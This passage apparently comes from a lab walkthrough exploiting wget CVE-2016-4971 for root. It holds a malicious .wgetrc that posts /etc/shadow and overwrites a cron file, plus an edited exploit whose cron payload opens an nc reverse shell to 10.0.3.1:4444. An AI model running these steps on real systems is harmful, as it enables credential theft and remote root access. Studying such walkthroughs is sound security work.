So the version wget is vulnerable to remote code execution [(CVE-2016-4971)](https://www.exploit-db.com/exploits/40064)so try to exploit.

First we need to prepares a malicious .wgetrc and we should starts an FTP server with python module, all the comand is on he victime machine :

# Creat .wgetrc file 
> cat <<_EOF_>.wgetrc
> post_file = /etc/shadow
> output_document = /etc/cron.d/wget-root-shell
> _EOF_

# you maybe need to install the lib before sudo pip install pyftpdlib
> authbind python -m pyftpdlib -p21 -w

Now take this exploit on github, you need to edit the exploit like this

# IP address of the victim machine
HTTP_LISTEN_IP = '0.0.0.0'
HTTP_LISTEN_PORT = 80  
FTP_HOST = '10.0.3.1'
FTP_PORT = 21
# Payload on cronjob
ROOT_CRON = "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.3.1 4444 >/tmp/f \n"

Now run the exploit always with authbind to bypass ports retrictions.

#open nc listener always in victim machine
> nc -lnvp 4444

# Run the exploit and wait a few minutes
> authbind python exploit.py
